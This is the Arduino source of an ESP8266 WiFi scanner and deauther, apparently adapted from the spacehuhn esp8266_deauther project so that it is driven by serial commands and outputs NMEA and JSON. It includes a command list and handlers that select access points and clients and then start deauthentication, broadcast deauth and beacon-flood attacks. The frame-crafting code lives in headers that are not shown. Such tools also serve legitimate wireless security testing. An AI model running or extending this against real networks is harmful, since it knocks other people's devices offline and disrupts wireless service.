/*
 * Wifi and U-BLOX GPS scanner / Wifi deauther
 * Same as https://github.com/spacehuhn/esp8266_deauther
 * but using serial instead of http for commands
 * and outputing messages in NMEA+JSON format
 * 
 */
#define DEBUG false
#define dowifiscan true // set this to false when using the wifistart/wifistop serial commands
#define dogpsscan false // set this to false when using the nmeastart/nmeastop serial commands

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <WiFiUdp.h>
// deps: TinyGPSPlus // #include <TinyGPS++.h> // https://github.com/mikalhart/TinyGPSPlus


extern "C" {
  #include "user_interface.h"
}

#include "data.h"
#include "NameList.h"
#include "APScan.h"
#include "ClientScan.h"
#include "Attack.h"

const static char *deautherssid = "WootMoo"; // famous jammer
const static char *deautherpassword = "SaveTheTreesEatBeavers"; // set this to something really impossible

ESP8266WebServer server(80);

#define helpMessageSize 16
String helpMessages[helpMessageSize] = {
      "Command List:",
      "  apjson [ap id]      Print Scan Result for AP xx [sendAPResult(xx)]",
      "  apscan              Start AP Scan [startAPScan]",
      "  aplist              Prints AP Scan List",
      "  apgo [ap name]      Search, Select and Print AP named 'blah' [getResultByAPName('blah')]",
      "  apselect [ap id]    Select AP [selectAP(xx)]",
      "  cscan               Start Client Scan [startClientScan]",
      "  cjson               Get Client Scan Results [sendClientResults]",
      "  cselect [client id] Select Client [selectClient(xx)]",
      "  cset [name]         BookMark Client setClientName(clientSelected, xx)",
      "  attackinfo          Show Last Attack Info sendAttackInfo",
      "  attack [attack num] Start Attack [startAttack(xx)]",
      "                          0 = deauth_selected",
      "                          1 = deauth broadcast",
      "                          2 = beacon",
      "                          3 = random beacon"
};
unsigned int helpMessagesPos = 0;



bool firstLoop = true;
String incomingSerialData = "";
bool incomingSerialDataReady = false;



NameList nameList;

APScan apScan;
ClientScan clientScan;
Attack attack;

void sniffer(uint8_t *buf, uint16_t len){
  clientScan.packetSniffer(buf,len);
}

void startWifi(){
  WiFi.mode(WIFI_STA);
  wifi_set_promiscuous_rx_cb(sniffer);
  WiFi.softAP(deautherssid, deautherpassword);
  // not really useful since we've ditched the web server
  //Serial.println("SSID: "+(String)deautherssid);
  //Serial.println("Password: "+(String)deautherpassword);
}

// Wifi-NMEA: Checksum calculation tool
int checkSum(String theseChars) {
  char check = 0;
  // iterate over the string, XOR each byte with the total sum:
  for (int c = 0; c < theseChars.length(); c++) {
    check = char(check ^ theseChars.charAt(c));
  } 
  // return the result
  return check;
}

// Wifi-NMEA: Hex checkSum conversion tool (byte only)
String hex(byte num, int precision) {
   char tmp[2] = {0};
   sprintf(tmp, "%02X", num); // add leading zero
   return tmp;
}

// Wifi-NMEA: NMEA message building tool
String toNmeaMessage(String cmd) {
  int myCheckSum = checkSum(cmd);
  String checkSumStr = hex(myCheckSum,2);
  cmd = "$" + cmd + "*" + checkSumStr;
  return (cmd);
}


void handleSerialClient() {

  // serial command received!
  String msg = incomingSerialData;
  String msgNumStr;
  int msgNum;
  
  msg.trim();
  
  if(msg=="*") {
    Serial.println();
    Serial.print(toNmeaMessage( "HELP," + helpMessages[helpMessagesPos] ));
    helpMessagesPos++;
    if( helpMessagesPos < helpMessageSize ) {
      // continue with async printing
      return;
    }
    helpMessagesPos = 0;
      
  } else if(msg=="cscan") { // startClientScan
    if(apScan.selected > -1 && !clientScan.sniffing) {
      if(DEBUG) Serial.println();
      if(DEBUG) Serial.print(toNmeaMessage("CLIENT SCAN START"));
      clientScan.start(30);
      attack.stop(0);
    }
    
  } else if(msg=="apscan") { // startAPScan
    if(apScan.asyncIndex>=0) {
      apScan.process(apScan.asyncIndex);
      apScan.asyncIndex--;
      
      if(apScan.asyncIndex<0) {
        // scan done
        if(DEBUG) Serial.println();
        if(DEBUG) Serial.print(toNmeaMessage("AP SCAN DONE, found " + String(apScan.results) + " results"));
        attack.stopAll();
        apScan.setAsyncIndex();
        incomingSerialData = "aplist";
        return;
      } else {
        // continue with async polling
        if(DEBUG) Serial.println();
        if(DEBUG) Serial.print( toNmeaMessage(".") );
        return;
      }
    } else {
      if(DEBUG) Serial.println();
      if(DEBUG) Serial.print(toNmeaMessage("STARTING AP SCAN"));
      if(apScan.scan() > 0) {
        // wifiscan successful, start async scanning
        return;
      }
    }

  } else if(msg=="aplist") { // 
    if(apScan.results==0) {
      incomingSerialData = "apscan";
      return;
    }
    if(apScan.asyncIndex>=0) {
      Serial.println();
      Serial.print(toNmeaMessage("JSON." + apScan.getResult(apScan.asyncIndex)));
      apScan.asyncIndex--;
      
      if(apScan.asyncIndex<0) {
        // scan done, reset async index
        apScan.setAsyncIndex();
      } else {
        // continue with async printing
        return;
      }
    } else {
      // list done, reset async index
      apScan.setAsyncIndex();
    }
  
  } else if(msg=="cjson") { // sendClientResults
    Serial.println();
    Serial.print(toNmeaMessage("JSON." + clientScan.getResults()));
    
  } else if(msg=="attackinfo") { // sendAttackInfo
    Serial.println();
    Serial.print( toNmeaMessage("JSON." + attack.getResults()) );
    
  } else if(msg.startsWith("cselect ")) { // selectClient(x)
    msgNumStr = msg.substring(8);
    msgNum = msgNumStr.toInt();
    if(msgNum>-1) {
      if(DEBUG) Serial.println();
      if(DEBUG) Serial.print(toNmeaMessage("SELECTED Client #" + msgNumStr));
      clientScan.select(msgNum);
      attack.stop(0);
    }
    
  } else if(msg.startsWith("apjson ")) { // sendAPResults(xx)
    msgNumStr = msg.substring(7);
    msgNum = msgNumStr.toInt();
    if(msgNum>-1) {
      Serial.println();
      Serial.print( toNmeaMessage( "JSON." + apScan.getResult(msgNum)) );
    }
    
  } else if(msg.startsWith("apgo ")) { // getResultByAPName('blah')
    msgNumStr = msg.substring(5);
    if(msgNumStr!="") {
      int apNum = (apScan.getResultByAPName(msgNumStr, false)).toInt();
      if(apNum>-1) {
        if(DEBUG) Serial.println();
        if(DEBUG) Serial.print(toNmeaMessage("AUTO SELECTED AP #" + msgNumStr));
        Serial.println();
        Serial.print(toNmeaMessage("JSON." + apScan.getResult(apNum)));
        apScan.select(apNum);
        attack.stopAll();
        if(apScan.selected > -1 && !clientScan.sniffing) {
          if(DEBUG) Serial.println();
          if(DEBUG) Serial.print(toNmeaMessage("AUTO CLIENT SCAN START"));
          incomingSerialData = "cscan";
          return;
        }
      } else {
        Serial.println();
        if(msgNumStr!="*") {
          Serial.print(toNmeaMessage("ERROR,AP Not Found:" + msgNumStr));
        }
      }
    }
    
  } else if(msg.startsWith("apselect ")) { // selectAP(x)
    msgNumStr = msg.substring(9);
    msgNum = msgNumStr.toInt();
    if(msgNum>-1) {
      if(DEBUG) Serial.println();
      if(DEBUG) Serial.print(toNmeaMessage("SELECTED AP #" + msgNumStr));
      apScan.select(msgNum);
      attack.stopAll();
    }
    
  } else if(msg.startsWith("cset ")) { // setClientName(x)
    msgNumStr = msg.substring(5);
    //msgNum = msgNumStr.toInt();
    if(msgNumStr!="") {
      if(DEBUG) Serial.println();
      if(DEBUG) Serial.print(toNmeaMessage("Adding " + msgNumStr + " to namelist"));
      nameList.add(clientScan.getClientMac(clientScan.lastSelected), msgNumStr);
    }
    
  } else if(msg.startsWith("attack ")) { // attack(x)
    msgNumStr = msg.substring(7);
    msgNum = msgNumStr.toInt();
    if(msgNum>-1) {
      if(apScan.selected > -1 || msgNum == 3){
        attack.start(msgNum);
        if(DEBUG) Serial.println();
        if(DEBUG) Serial.print(toNmeaMessage("ATTACK Client #" + msgNumStr));
      }
    }
    
  }
  
  incomingSerialData = "";
  incomingSerialDataReady = false;

 
}


void setup() {
  Serial.begin(115200);

  nameList.begin();
  //nameList.clear();
  nameList.load();
  startWifi();
  attack.generate(-1);

  Serial.println();
  Serial.print("[READY] Type * for command list");
  Serial.println();
}


void loop() {
  bool show_hidden = false;
  byte inByte = 0;
  byte outByte = 0;

  if(clientScan.sniffing){
    if(clientScan.stop()){
      if(DEBUG) Serial.println( "CLIENT SCAN DONE" );
      Serial.println();
      Serial.print( toNmeaMessage("JSON," + clientScan.getResults() ) );
      startWifi();
    }
  } else{
    if(incomingSerialDataReady) {
      handleSerialClient();
    }
    attack.run();
  }


  if(Serial.available()){
    // Read Arduino IDE Serial Monitor inputs (if available) and capture orders
    outByte = Serial.read();
    if(outByte==13) {
      incomingSerialDataReady = true;
    } else {
      incomingSerialData = incomingSerialData + (char)outByte;
    }
  }

}



